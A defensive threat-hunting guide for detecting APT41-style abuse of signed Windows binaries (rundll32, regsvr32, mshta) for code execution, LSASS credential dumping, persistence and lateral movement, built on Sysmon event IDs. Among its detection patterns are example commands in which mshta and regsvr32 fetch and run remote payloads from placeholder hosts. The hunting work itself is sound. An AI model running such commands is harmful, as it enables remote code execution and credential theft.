
> 🎯 **Objective**: Hunt for credential access and execution activity consistent with **APT41** using **Signed Binary Proxy Execution** (e.g., `rundll32`, `regsvr32`, `mshta`, etc.) to bypass detection and steal credentials via indirect means.

This hunt does **not rely on alerts** — instead, it investigates subtle execution chains abusing trusted Windows binaries.

---

## ✅ Hypothesis

> “An APT is using signed Microsoft binaries (LOLBINs) to proxy malicious code execution and dump credentials, bypassing direct malware detection.”

---

## 🧱 Tactics to Focus On

1. **Execution** — Trusted binaries loading untrusted content
2. **Credential Access** — LSASS dump, token theft
3. **Defense Evasion** — Use of signed binaries, obfuscation
4. **Persistence** — DLLs registered via regsvr32
5. **Lateral Movement** — Reuse of stolen credentials or tokens

---

## 🔍 Hunt Steps (True Threat Hunt Chain)

---

### **1. Hunt for Suspicious Use of LOLBINs**

**Why:**
APT41 is known for using signed Windows binaries to execute payloads indirectly, avoiding EDR triggers.

**Look For:**

* Sysmon Event ID 1:

  * `rundll32.exe`, `regsvr32.exe`, `mshta.exe`, `installutil.exe`
* Suspicious `CommandLine`, such as:

  * `rundll32.exe javascript:"..."`
  * `mshta.exe http://<external-IP>/payload.hta`
  * `regsvr32 /s /n /u /i:http://domain/payload.sct scrobj.dll`

**Thought Process:**

> Why is a Microsoft-signed binary reaching out to an external host or running a script?

---

### **2. Identify Loaded Modules or DLLs**

**Why:**
APT41 often uses custom DLLs for execution or persistence, loaded via LOLBINs.

**Look For:**

* Sysmon Event ID 7:

  * DLLs loaded from non-standard paths (e.g., `C:\ProgramData\`, `%TEMP%`, `%APPDATA%`)
* Rare DLL names or timestamps mismatching system boot

**Thought Process:**

> Was a non-standard or unsigned DLL loaded by a trusted binary?

---

### **3. Trace Credential Access Tactics**

**Why:**
APT41 has leveraged proxy execution to dump LSASS or steal tokens.

**Look For:**

* Sysmon Event ID 10:

  * `SourceImage`: `rundll32.exe`, `powershell.exe`, `dllhost.exe`
  * `TargetImage`: `lsass.exe`
  * `GrantedAccess`: `0x1fffff`, `0x1438`

**Thought Process:**

> Was LSASS accessed by a process that shouldn't be touching it?

---

### **4. File Creation Linked to Dumps or Recon**

**Why:**
Extracted credential dumps may be staged in `.dmp`, `.zip`, `.dat` files before exfiltration.

**Look For:**

* Sysmon Event ID 11:

  * Files written to `%TEMP%`, `%APPDATA%`, `C:\ProgramData`
  * Suspicious extensions or hidden files

**Thought Process:**

> Were credentials or memory dumps staged locally?

---

### **5. Network Indicators from LOLBIN Execution**

**Why:**
Payloads may be retrieved or exfiltrated via LOLBIN-based execution.

**Look For:**

* Sysmon Event ID 3:

  * Outbound traffic from `mshta.exe`, `rundll32.exe`, etc.
  * Odd ports, no reverse DNS, first-seen domains

**Correlate With:**

* Suricata/Zeek logs
* Domain reputation checks (VirusTotal, URLhaus)

**Thought Process:**

> Is a trusted binary being used as a C2 agent?

---

### **6. Persistence via Registry or WMI**

**Why:**
APT41 has used `regsvr32` to set up persistence via COM hijacking or malicious DLL registration.

**Look For:**

* Sysmon Event ID 13:

  * Registry keys under `HKCU\Software\Classes\CLSID` or `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* Unusual entries for scriptlets or DLLs

**Thought Process:**

> Did this signed binary quietly register persistence?
> Was WMI used to schedule or bind it?

---

### **7. Trace Use of Stolen Credentials**

**Why:**
After stealing credentials, APT41 moves laterally using RDP or PS Remoting.

**Look For:**

* Event ID 4624 with LogonType 3 or 10 (network/RDP)
* Event ID 4648 (explicit credential use)
* Anomalous account logons from new hosts

**Thought Process:**

> Was lateral movement done using new accounts shortly after dump?

---

## 🧠 Summary

This hunt assumes **no alerts** and requires:

* Knowledge of **LOLBIN abuse patterns**
* Close inspection of **process and module behavior**
* Tracing of **credential access** without obvious tools
* Correlation across **execution, registry, and network telemetry**